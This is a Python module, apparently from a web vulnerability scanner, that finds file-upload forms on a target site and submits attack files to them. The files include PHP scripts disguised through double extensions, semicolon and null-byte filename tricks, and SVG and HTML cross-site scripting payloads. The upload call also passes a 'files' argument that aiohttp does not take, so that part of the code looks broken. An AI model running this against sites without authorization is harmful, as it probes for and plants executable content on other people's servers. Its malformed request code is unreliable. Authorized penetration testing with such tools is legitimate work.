# exploits/file_upload_test.py

import aiohttp
import asyncio
import logging
from typing import List, Optional
from urllib.parse import urljoin
from bs4 import BeautifulSoup
import io

DEFAULT_HEADERS = {
    "User-Agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                   "AppleWebKit/537.36 (KHTML, like Gecko) "
                   "Chrome/100.0.4896.127 Safari/537.36")
}

# Common suspicious payload filenames to test
PAYLOAD_FILES = [
    ("shell.php", "<?php echo 'pwned'; ?>"),
    ("shell.php.jpg", "<?php echo 'pwned'; ?>"),
    ("shell.php;.jpg", "<?php echo 'pwned'; ?>"),
    ("shell.jpg", "<?php echo 'pwned'; ?>"),
    ("shell.php\0.jpg", "<?php echo 'pwned'; ?>"),  # null byte attack
    ("shell.phtml", "<?php echo 'pwned'; ?>"),
    ("payload.svg", '<svg/onload=alert(1)>'),
    ("payload.html", '<script>alert(1)</script>'),
]

# Check common file upload field names
COMMON_FILE_FIELDS = ["file", "upload", "image", "attachment", "docfile"]

async def fetch_html(session: aiohttp.ClientSession, url: str, proxy: Optional[str] = None) -> str:
    try:
        async with session.get(url, headers=DEFAULT_HEADERS, proxy=proxy, ssl=False) as resp:
            return await resp.text(errors="ignore")
    except Exception as e:
        logging.debug(f"[FILE-UPLOAD] Error fetching {url}: {e}")
        return ""

def find_file_upload_forms(html: str) -> List[dict]:
    soup = BeautifulSoup(html, "html.parser")
    forms = []
    for form in soup.find_all("form"):
        if form.find("input", {"type": "file"}) or form.find("input", type="file"):
            inputs = {inp.get("name") for inp in form.find_all("input") if inp.get("name")}
            forms.append({
                "action": form.get("action"),
                "method": form.get("method", "post").lower(),
                "inputs": inputs,
            })
    return forms

async def test_file_upload(session: aiohttp.ClientSession, url: str, form: dict, file_field: str, 
                           filename: str, file_content: str, proxy: Optional[str] = None) -> Optional[dict]:
    action_url = urljoin(url, form["action"] or "")
    method = form["method"]
    files = {
        file_field: (filename, io.BytesIO(file_content.encode()), 'application/octet-stream')
    }
    try:
        if method == "post":
            async with session.post(action_url, data={}, headers=DEFAULT_HEADERS, proxy=proxy,
                                    ssl=False, files=files) as resp:
                text = await resp.text(errors="ignore")
        else:
            # If method is GET for file upload (unlikely), send as params
            async with session.get(action_url, params={file_field: filename}, headers=DEFAULT_HEADERS,
                                   proxy=proxy, ssl=False) as resp:
                text = await resp.text(errors="ignore")

        # Basic heuristics for successful upload or vulnerability indicators
        success_indicators = [
            "successfully uploaded", "file uploaded", "upload complete", "upload successful",
            "shell", "pwned", filename
        ]
        if any(ind in text.lower() for ind in success_indicators):
            logging.info(f"[FILE-UPLOAD] Possible upload success for {filename} at {action_url}")
            return {
                "url": action_url,
                "file_field": file_field,
                "filename": filename,
                "vuln": "Potential File Upload Vulnerability",
                "response_snippet": text[:200]
            }
    except Exception as e:
        logging.debug(f"[FILE-UPLOAD] Error uploading file {filename} to {action_url}: {e}")
    return None

async def run_file_upload_tests(base_url: str, proxy: Optional[str] = None) -> List[dict]:
    logging.info(f"[FILE-UPLOAD] Starting file upload tests on {base_url}")
    findings = []
    async with aiohttp.ClientSession() as session:
        html = await fetch_html(session, base_url, proxy)
        forms = find_file_upload_forms(html)

        for form in forms:
            for file_field in (form["inputs"] & set(COMMON_FILE_FIELDS)):
                for filename, content in PAYLOAD_FILES:
                    result = await test_file_upload(session, base_url, form, file_field, filename, content, proxy)
                    if result:
                        findings.append(result)

    logging.info(f"[FILE-UPLOAD] File upload tests completed, found {len(findings)} potential issues")
    return findings
